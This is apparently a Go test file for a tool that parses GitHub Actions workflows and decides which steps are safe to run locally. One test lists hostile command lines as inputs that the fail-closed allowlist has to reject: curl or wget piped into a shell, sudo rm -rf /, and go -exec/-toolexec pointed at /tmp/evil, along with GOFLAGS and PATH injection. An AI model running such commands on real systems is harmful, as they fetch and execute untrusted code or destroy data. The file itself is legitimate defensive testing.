package ciparity

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// A representative Go CI workflow modeled on this repo's own ci.yml: a matrix build with
// action steps, a global-git-config setup step, and three real check steps.
const goCIWorkflow = `name: CI
on:
  push:
    branches: [main]
  pull_request:
jobs:
  build:
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: stable
      - name: configure git identity
        run: |
          git config --global user.email "ci@ttorch.local"
          git config --global user.name "ttorch ci"
      - name: gofmt
        run: test -z "$(gofmt -l .)" || { echo 'run gofmt -w .'; gofmt -l .; exit 1; }
      - name: vet
        run: go vet ./...
      - name: test
        run: go test ./...
`

// A tag-triggered release workflow: not a pull_request/push-branch CI workflow.
const releaseWorkflow = `name: release
on:
  push:
    tags: ["v*"]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: build
        run: make dist
`

// Exercises every step-level and job-level skip reason, plus the inline-flow `on:` form.
const miscWorkflow = `name: misc
on: [push, pull_request]
jobs:
  guarded:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: echo nope
  checks:
    runs-on: ubuntu-latest
    steps:
      - name: deploy
        run: gh release create v1
      - name: win-only
        shell: pwsh
        run: Write-Host hi
      - name: in-subdir
        working-directory: ./sub
        run: make build
      - name: guarded-step
        if: failure()
        run: echo cleanup
      - name: matrix-ref
        run: echo ${{ matrix.os }}
      - name: real
        run: go build ./...
`

// A block sequence whose dashes sit at the same indent as the "steps:" key.
const sameIndentSteps = `name: x
on: [pull_request]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
    - name: a
      run: echo a
    - name: b
      run: echo b
`

func parse(t *testing.T, file, body string) ([]Step, []Skip) {
	t.Helper()
	steps, skips, err := ParseWorkflow(file, []byte(body))
	if err != nil {
		t.Fatalf("ParseWorkflow(%s) error: %v", file, err)
	}
	return steps, skips
}

func stepByName(steps []Step, name string) (Step, bool) {
	for _, s := range steps {
		if s.Name == name {
			return s, true
		}
	}
	return Step{}, false
}

func skipByName(skips []Skip, name string) (Skip, bool) {
	for _, s := range skips {
		if s.Name == name {
			return s, true
		}
	}
	return Skip{}, false
}

func TestParseWorkflow_GoCI(t *testing.T) {
	steps, skips := parse(t, "ci.yml", goCIWorkflow)

	wantRun := []string{"gofmt", "vet", "test"}
	if got := stepNames(steps); !equalStrings(got, wantRun) {
		t.Fatalf("reproducible steps = %v, want %v", got, wantRun)
	}

	if s, _ := stepByName(steps, "test"); s.Run != "go test ./..." {
		t.Fatalf("test step Run = %q, want %q", s.Run, "go test ./...")
	}
	if s, _ := stepByName(steps, "gofmt"); !strings.Contains(s.Run, "gofmt -l .") {
		t.Fatalf("gofmt step Run = %q, want it to contain the gofmt invocation", s.Run)
	}

	// checkout + setup-go are action steps; the git-identity step mutates global state.
	if _, ok := skipByName(skips, "configure git identity"); !ok {
		t.Fatalf("expected the git-identity step to be skipped; skips = %+v", skips)
	}
	usesSkips := 0
	globalSkip := false
	for _, s := range skips {
		if strings.Contains(s.Reason, "uses:") {
			usesSkips++
		}
		if strings.Contains(s.Reason, "git config --global") {
			globalSkip = true
		}
	}
	if usesSkips != 2 {
		t.Fatalf("expected 2 `uses:` skips (checkout, setup-go), got %d: %+v", usesSkips, skips)
	}
	if !globalSkip {
		t.Fatalf("expected a global-mutation skip reason; skips = %+v", skips)
	}
}

func TestParseWorkflow_NonCIWorkflowSkipped(t *testing.T) {
	steps, skips := parse(t, "release.yml", releaseWorkflow)
	if len(steps) != 0 {
		t.Fatalf("a tag-only release workflow should yield no reproducible steps, got %v", stepNames(steps))
	}
	if len(skips) != 1 || skips[0].Job != "" || !strings.Contains(skips[0].Reason, "not a pull_request/push-branch CI workflow") {
		t.Fatalf("expected one whole-workflow skip, got %+v", skips)
	}
}

func TestParseWorkflow_SkipReasons(t *testing.T) {
	steps, skips := parse(t, "misc.yml", miscWorkflow)

	if names := stepNames(steps); !equalStrings(names, []string{"real"}) {
		t.Fatalf("reproducible steps = %v, want [real]", names)
	}

	cases := map[string]string{
		"deploy":       "auto-run allowlist",
		"win-only":     "unsupported shell",
		"in-subdir":    "working-directory",
		"guarded-step": "guarded by if:",
		"matrix-ref":   "GitHub Actions expression",
	}
	for name, want := range cases {
		s, ok := skipByName(skips, name)
		if !ok {
			t.Fatalf("expected step %q to be skipped; skips = %+v", name, skips)
		}
		if !strings.Contains(s.Reason, want) {
			t.Fatalf("skip %q reason = %q, want it to contain %q", name, s.Reason, want)
		}
	}

	// The whole `guarded` job is skipped by its job-level if.
	jobSkip := false
	for _, s := range skips {
		if s.Job == "guarded" && s.Name == "" && strings.Contains(s.Reason, "job guarded by if:") {
			jobSkip = true
		}
	}
	if !jobSkip {
		t.Fatalf("expected a job-level if skip for `guarded`; skips = %+v", skips)
	}
}

func TestParseWorkflow_SameIndentSequence(t *testing.T) {
	steps, _ := parse(t, "x.yml", sameIndentSteps)
	if names := stepNames(steps); !equalStrings(names, []string{"a", "b"}) {
		t.Fatalf("same-indent steps = %v, want [a b]", names)
	}
	if s, _ := stepByName(steps, "a"); s.Run != "echo a" {
		t.Fatalf("step a Run = %q, want %q", s.Run, "echo a")
	}
}

func TestParseWorkflow_MultiLineRunBlockScalar(t *testing.T) {
	const wf = `on: [pull_request]
jobs:
  j:
    steps:
      - name: many
        run: |
          set -x
          go build ./...
          go test ./...
`
	steps, _ := parse(t, "wf.yml", wf)
	s, ok := stepByName(steps, "many")
	if !ok {
		t.Fatalf("expected a reproducible step `many`; steps = %+v", steps)
	}
	// scalarOf trims surrounding whitespace, so the block's trailing newline is dropped;
	// interior newlines are preserved.
	want := "set -x\ngo build ./...\ngo test ./..."
	if s.Run != want {
		t.Fatalf("block-scalar Run = %q, want %q", s.Run, want)
	}
}

func TestParseWorkflow_EnvNote(t *testing.T) {
	const wf = `on: [pull_request]
jobs:
  j:
    steps:
      - name: build
        env:
          CGO_ENABLED: "0"
          GOFLAGS: -mod=mod
        run: go build ./...
`
	steps, _ := parse(t, "wf.yml", wf)
	s, ok := stepByName(steps, "build")
	if !ok {
		t.Fatalf("expected reproducible step `build`; steps = %+v", steps)
	}
	if !strings.Contains(s.Note, "CGO_ENABLED") || !strings.Contains(s.Note, "GOFLAGS") {
		t.Fatalf("env note = %q, want it to name the env keys", s.Note)
	}
}

func TestStepCommand(t *testing.T) {
	bash := Step{Run: "go test ./..."}.Command()
	if len(bash) == 0 || bash[0] != "bash" || bash[len(bash)-1] != "go test ./..." {
		t.Fatalf("bash command = %v", bash)
	}
	if !contains(bash, "pipefail") {
		t.Fatalf("bash command should set pipefail: %v", bash)
	}
	// sh deliberately omits pipefail (POSIX sh need not support it); pin the exact argv.
	sh := Step{Shell: "sh", Run: "echo hi"}.Command()
	if !equalStrings(sh, []string{"sh", "-e", "-c", "echo hi"}) {
		t.Fatalf("sh command = %v, want [sh -e -c echo hi]", sh)
	}
}

func TestStepLabel(t *testing.T) {
	got := Step{Workflow: "ci.yml", Job: "build", Name: "test"}.Label()
	if got != "ci(ci.yml/build): test" {
		t.Fatalf("Label = %q", got)
	}
}

func TestExtract(t *testing.T) {
	dir := t.TempDir()
	wf := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(wf, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wf, "ci.yml"), []byte(goCIWorkflow), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wf, "release.yml"), []byte(releaseWorkflow), 0o644); err != nil {
		t.Fatal(err)
	}
	// A non-workflow file in the directory must be ignored.
	if err := os.WriteFile(filepath.Join(wf, "README.md"), []byte("ignore me"), 0o644); err != nil {
		t.Fatal(err)
	}

	plan, err := Extract(dir)
	if err != nil {
		t.Fatalf("Extract error: %v", err)
	}
	if !equalStrings(plan.Files, []string{"ci.yml", "release.yml"}) {
		t.Fatalf("plan.Files = %v, want sorted [ci.yml release.yml]", plan.Files)
	}
	if names := stepNames(plan.Steps); !equalStrings(names, []string{"gofmt", "vet", "test"}) {
		t.Fatalf("plan.Steps = %v, want [gofmt vet test]", names)
	}
	if len(plan.ParseErrors) != 0 {
		t.Fatalf("unexpected parse errors: %v", plan.ParseErrors)
	}
	// The release workflow contributes a whole-workflow skip.
	found := false
	for _, s := range plan.Skipped {
		if s.Workflow == "release.yml" && s.Job == "" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a release.yml whole-workflow skip; skipped = %+v", plan.Skipped)
	}
}

func TestExtract_NoWorkflowsDir(t *testing.T) {
	plan, err := Extract(t.TempDir())
	if err != nil {
		t.Fatalf("Extract on a repo without workflows should not error, got %v", err)
	}
	if len(plan.Files) != 0 || len(plan.Steps) != 0 || len(plan.Skipped) != 0 {
		t.Fatalf("expected an empty plan, got %+v", plan)
	}
}

// A workflow exercising the structural shapes that must be reported as skips rather than
// dropped silently: a reusable-workflow job, a non-mapping job, and a non-mapping step.
const silentDropWorkflow = `on: [pull_request]
jobs:
  reusable:
    uses: ./.github/workflows/lint.yml
  weird: just-a-scalar
  build:
    steps:
      - a bare scalar step
      - name: real
        run: go build ./...
`

func TestParseWorkflow_NoSilentDrops(t *testing.T) {
	steps, skips := parse(t, "drops.yml", silentDropWorkflow)

	if names := stepNames(steps); !equalStrings(names, []string{"real"}) {
		t.Fatalf("reproducible steps = %v, want [real]", names)
	}

	want := map[string]string{ // job (or step) -> required substring of its skip reason
		"reusable": "reusable-workflow job (uses:",
		"weird":    "job definition is not a mapping",
	}
	for job, sub := range want {
		found := false
		for _, s := range skips {
			if s.Job == job && strings.Contains(s.Reason, sub) {
				found = true
			}
		}
		if !found {
			t.Fatalf("expected job %q skip containing %q; skips = %+v", job, sub, skips)
		}
	}
	// The bare-scalar step in `build` must surface as a skip, not vanish.
	stepDrop := false
	for _, s := range skips {
		if s.Job == "build" && strings.Contains(s.Reason, "step is not a mapping") {
			stepDrop = true
		}
	}
	if !stepDrop {
		t.Fatalf("expected a non-mapping step skip in `build`; skips = %+v", skips)
	}
}

func TestParseWorkflow_InheritedDefaultShellSkipped(t *testing.T) {
	const wf = `on: [pull_request]
jobs:
  win:
    defaults:
      run:
        shell: pwsh
    steps:
      - name: ps
        run: Write-Host hi
`
	steps, skips := parse(t, "win.yml", wf)
	if len(steps) != 0 {
		t.Fatalf("a pwsh step inherited from defaults.run must not be reproduced, got %v", stepNames(steps))
	}
	s, ok := skipByName(skips, "ps")
	if !ok || !strings.Contains(s.Reason, "unsupported shell: pwsh") {
		t.Fatalf("expected an unsupported-shell skip for the inherited pwsh default; skips = %+v", skips)
	}
}

func TestParseWorkflow_UnnamedStepLabelTruncated(t *testing.T) {
	long := "echo " + strings.Repeat("x", 100)
	wf := "on: [pull_request]\njobs:\n  j:\n    steps:\n      - run: " + long + "\n"
	steps, _ := parse(t, "u.yml", wf)
	if len(steps) != 1 {
		t.Fatalf("want 1 step, got %d", len(steps))
	}
	name := steps[0].Name
	if !strings.HasPrefix(name, "echo ") || !strings.HasSuffix(name, "…") {
		t.Fatalf("derived label = %q, want an `echo …` truncation", name)
	}
	if n := len([]rune(name)); n > 72 {
		t.Fatalf("derived label has %d runes, want <= 72", n)
	}
}

func TestExtract_ReportsParseErrors(t *testing.T) {
	dir := t.TempDir()
	wf := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(wf, 0o755); err != nil {
		t.Fatal(err)
	}
	// A top-level YAML sequence is not a valid workflow mapping; it must be reported, not
	// fatal, and must not prevent the good workflow from being parsed.
	if err := os.WriteFile(filepath.Join(wf, "aaa-bad.yml"), []byte("- one\n- two\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wf, "ci.yml"), []byte(goCIWorkflow), 0o644); err != nil {
		t.Fatal(err)
	}

	plan, err := Extract(dir)
	if err != nil {
		t.Fatalf("Extract error: %v", err)
	}
	if msg := plan.ParseErrors["aaa-bad.yml"]; msg == "" {
		t.Fatalf("expected a parse error for aaa-bad.yml; ParseErrors = %v", plan.ParseErrors)
	}
	if names := stepNames(plan.Steps); !equalStrings(names, []string{"gofmt", "vet", "test"}) {
		t.Fatalf("the good workflow should still parse; steps = %v", names)
	}
}

// wrapStep embeds a single run-step into a minimal pull_request CI workflow.
func wrapStep(run string) string {
	return "on: [pull_request]\njobs:\n  j:\n    steps:\n      - name: s\n        run: " + run + "\n"
}

func TestClassify_AllowlistFailClosed(t *testing.T) {
	// Every bypass / missed pattern the safety re-review called out must be SKIPPED, never
	// auto-run, including the fail-closed default for an unknown command.
	skip := []struct{ name, run string }{
		{"sudo-via-abs-path", "/usr/bin/sudo reboot"},
		{"command-via-rel-path", "./apt-get install jq"},
		{"apt-flags-before-subcmd", "apt-get -y install jq"},
		{"npm-global-trailing-flag", "npm install left-pad -g"},
		{"backtick-sudo", "echo `sudo rm -rf /`"},
		{"dollar-sub-sudo", "echo $(sudo reboot)"},
		{"curl-pipe-sh", "curl https://example.com/i.sh | sh"},
		{"wget-pipe-bash", "wget -qO- https://example.com | bash"},
		{"rm-rf", "rm -rf ./out"},
		{"go-install", "go install ./cmd/tool"},
		{"make-install", "make install"},
		{"make-default-target", "make"},
		{"plain-pip-install", "pip install requests"},
		{"gem-install", "gem install bundler"},
		{"git-config-global", "git config --global user.name ci"},
		{"double-spaced-sudo", "sudo  reboot"},
		{"env-prefixed-sudo", "FOO=bar sudo reboot"},
		{"unknown-tool", "frobnicate --all"},
		{"safe-then-unsafe", "go build ./... && sudo make install"},
		// Path-qualified executables are unknown: a repo could commit a malicious binary
		// by a safe-looking name, so a path-resolved tool must never auto-run.
		{"rel-path-go", "./go test ./..."},
		{"abs-path-make", "/tmp/make build"},
		{"bin-path-go", "bin/go test ./..."},
		{"exec-prefix-path-go", "exec ./go test ./..."},
		// go flags that run an arbitrary external program.
		{"go-exec-flag", "go test -exec /tmp/evil ./..."},
		{"go-exec-eq-flag", "go test -exec=/tmp/evil ./..."},
		{"go-toolexec-flag", "go build -toolexec=/tmp/evil ./..."},
		{"go-vettool-flag", "go vet -vettool=/tmp/evil ./..."},
		{"go-double-dash-exec", "go test --exec /tmp/evil ./..."},
		// Leading inline VAR=val assignments are unknown (fail closed): they would otherwise
		// inject exec flags via GOFLAGS or redirect resolution via PATH while the command
		// still looks like a clean go build/test.
		{"goflags-toolexec-inject", "GOFLAGS=-toolexec=/tmp/evil go build ./..."},
		{"path-dot-inject", "PATH=. go test ./..."},
		{"path-pwd-inject", "PATH=$PWD go test ./..."},
		{"benign-inline-assignment", "FOO=bar go test ./..."},
	}
	for _, c := range skip {
		steps, skips := parse(t, "wf.yml", wrapStep(c.run))
		if len(steps) != 0 {
			t.Errorf("%s: run %q was reproduced but must be skipped (fail closed)", c.name, c.run)
		}
		if len(skips) == 0 || !strings.Contains(skips[len(skips)-1].Reason, "auto-run allowlist") {
			t.Errorf("%s: want an allowlist skip reason for %q, got %+v", c.name, c.run, skips)
		}
	}
}

func TestClassify_CommentLinesIgnored(t *testing.T) {
	// A comment line in a block-scalar run must not be mistaken for a command (which would
	// wrongly skip an otherwise-safe step); a '#' mid-word is not a comment.
	const wf = `on: [pull_request]
jobs:
  j:
    steps:
      - name: commented
        run: |
          # build then test
          go build ./...
          echo done#1
          go test ./...
`
	steps, skips := parse(t, "c.yml", wf)
	if len(steps) != 1 {
		t.Fatalf("a safe step with comment lines should be reproduced, got steps=%v skips=%+v", stepNames(steps), skips)
	}
}

func TestClassify_AllowlistRuns(t *testing.T) {
	// The safe set is reproduced — including a realistic gofmt guard that uses shell
	// builtins plus a command substitution.
	run := []string{
		"go test ./...",
		"go test -race -count=1 ./...", // benign flags must not trip the exec-flag guard
		"go vet ./...",
		"go build ./...",
		"go run ./cmd/x",
		"gofmt -l .",
		"golangci-lint run",
		"staticcheck ./...",
		"make test",
		"make build lint vet",
		"npm test",
		"npm run build",
		"yarn lint",
		`test -z "$(gofmt -l .)" || { echo ok; gofmt -l .; exit 1; }`,
	}
	for _, r := range run {
		steps, skips := parse(t, "wf.yml", wrapStep(r))
		if len(steps) != 1 {
			t.Errorf("run %q should be reproduced, got steps=%v skips=%+v", r, stepNames(steps), skips)
		}
	}
}

func TestParseWorkflow_EnvNoteAllScopes(t *testing.T) {
	const wf = `on: [pull_request]
env:
  WF_ONE: "1"
jobs:
  j:
    env:
      JOB_ONE: "2"
    steps:
      - name: build
        env:
          STEP_ONE: "3"
        run: go build ./...
`
	steps, _ := parse(t, "env.yml", wf)
	s, ok := stepByName(steps, "build")
	if !ok {
		t.Fatalf("expected reproducible step build; steps = %+v", steps)
	}
	for _, want := range []string{"workflow (WF_ONE)", "job (JOB_ONE)", "step (STEP_ONE)"} {
		if !strings.Contains(s.Note, want) {
			t.Fatalf("env note = %q, want it to contain %q", s.Note, want)
		}
	}
}

func TestParseWorkflow_EmptyFileIsNotAnError(t *testing.T) {
	for _, body := range []string{"", "# just a comment\n", "\n\n"} {
		steps, skips, err := ParseWorkflow("empty.yml", []byte(body))
		if err != nil {
			t.Fatalf("empty/comment-only workflow %q should not error, got %v", body, err)
		}
		if len(steps) != 0 || len(skips) != 0 {
			t.Fatalf("empty/comment-only workflow %q should yield nothing, got steps=%v skips=%v", body, steps, skips)
		}
	}
}

func stepNames(steps []Step) []string {
	out := make([]string, len(steps))
	for i, s := range steps {
		out[i] = s.Name
	}
	return out
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
